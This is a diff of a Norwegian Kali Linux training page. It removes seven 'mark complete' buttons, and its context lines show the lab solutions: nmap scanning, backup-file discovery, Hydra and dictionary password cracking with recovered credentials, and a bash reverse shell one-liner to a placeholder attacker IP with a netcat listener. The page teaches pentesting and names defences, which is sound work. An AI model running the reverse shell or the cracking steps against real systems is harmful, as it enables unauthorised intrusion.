@@ -144,7 +144,6 @@
           <div class="sol-box"><strong>Viktige stier i Kali:</strong><br><code>/home/kali</code> — din hjemmemappe<br><code>/usr/bin</code> — installerte programmer<br><code>/etc</code> — konfigurasjonsfiler<br><code>/var/log</code> — logger<br><br><strong>Tips:</strong> Tab-completion er din beste venn — trykk Tab for å autocomplete kommandoer og filnavn.</div>
         </div>
         <div class="complete-banner" id="done-kali-1"><span>✓</span> Lab 1 fullført!</div>
-        <button class="btn btn-success" style="margin-top:8px" onclick="markTaskDone('kali-1')">✓ Marker fullført</button>
       </div>
       <div class="lab-right">
         <div class="kali-desktop">
@@ -212,7 +211,6 @@
           <div class="sol-box"><strong>Typisk nmap-workflow:</strong><br>1. Rask skann: <code>nmap -T4 -p- [IP]</code> — finn alle åpne porter<br>2. Detaljert: <code>nmap -sV -sC -p [porter] [IP]</code> — finn versjoner<br>3. Dokumenter alt — noter porter, tjenester og versjoner<br><br><strong>Husk:</strong> nmap-skanning uten tillatelse er ulovlig mot systemer du ikke eier.</div>
         </div>
         <div class="complete-banner" id="done-kali-2"><span>✓</span> Lab 2 fullført!</div>
-        <button class="btn btn-success" style="margin-top:8px" onclick="markTaskDone('kali-2')">✓ Marker fullført</button>
       </div>
       <div class="lab-right">
         <div class="kali-desktop">
@@ -277,7 +275,6 @@
           <div class="sol-box"><strong>Nøkkelfunn på InnoTech:</strong><br><code>/admin</code> — 200 OK, innloggingspanel<br><code>/backup</code> — 403 Forbidden (eksisterer!)<br><code>/config.php.bak</code> — 200 OK (backup-fil!)<br><br>Backup-filer er en klassisk svakhet — utviklere glemmer å slette dem, og de inneholder ofte databasepassord i klartekst.</div>
         </div>
         <div class="complete-banner" id="done-kali-3"><span>✓</span> Lab 3 fullført!</div>
-        <button class="btn btn-success" style="margin-top:8px" onclick="markTaskDone('kali-3')">✓ Marker fullført</button>
       </div>
       <div class="lab-right">
         <div class="kali-desktop">
@@ -342,7 +339,6 @@
           <div class="sol-box"><strong>Passord funnet:</strong> <code>admin:password123</code><br><br><strong>Hva stopper Hydra:</strong><br>• Rate limiting (maks X forsøk/minutt)<br>• Account lockout etter N feil forsøk<br>• MFA / 2FA — passord alene er ikke nok<br>• Sterke, unike passord (ikke i wordlist)<br>• IP-blokkering via fail2ban</div>
         </div>
         <div class="complete-banner" id="done-kali-4"><span>✓</span> Lab 4 fullført!</div>
-        <button class="btn btn-success" style="margin-top:8px" onclick="markTaskDone('kali-4')">✓ Marker fullført</button>
       </div>
       <div class="lab-right">
         <div class="kali-desktop">
@@ -410,7 +406,6 @@
           <div class="sol-box"><strong>Knekte passord:</strong><br>root : <code>toor</code> (trivielt — standard Kali-passord!)<br>admin : <code>password123</code><br>dbuser : <code>Summer2023!</code><br><br><strong>Dictionary vs Brute force:</strong> Dictionary prøver ord fra en liste — raskt, men avhengig av at passordet er i lista. Brute force prøver alle kombinasjoner — alltid funnet til slutt, men kan ta millioner av år.</div>
         </div>
         <div class="complete-banner" id="done-kali-5"><span>✓</span> Lab 5 fullført!</div>
-        <button class="btn btn-success" style="margin-top:8px" onclick="markTaskDone('kali-5')">✓ Marker fullført</button>
       </div>
       <div class="lab-right">
         <div class="kali-desktop">
@@ -475,7 +470,6 @@
           <div class="sol-box"><strong>Reverse shell one-liner (bash):</strong><br><code>bash -i &gt;&amp; /dev/tcp/ANGRIPERS_IP/4444 0&gt;&amp;1</code><br><br>Kjøres på target-maskinen. Kobler tilbake til angripers <code>nc -lvnp 4444</code>.<br><br>Angriperen får en interaktiv shell på target — som om de satt foran maskinen.</div>
         </div>
         <div class="complete-banner" id="done-kali-6"><span>✓</span> Lab 6 fullført!</div>
-        <button class="btn btn-success" style="margin-top:8px" onclick="markTaskDone('kali-6')">✓ Marker fullført</button>
       </div>
       <div class="lab-right">
         <div class="kali-desktop">
@@ -569,7 +563,6 @@
         </div>
 
         <div class="complete-banner" id="done-kali-7"><span>✓</span> Lab 7 fullført — alle flagg funnet!</div>
-        <button class="btn btn-success" style="margin-top:8px" onclick="markTaskDone('kali-7')">✓ Marker fullført</button>
       </div>
       <div class="lab-right">
         <div class="kali-desktop" style="min-height:600px">
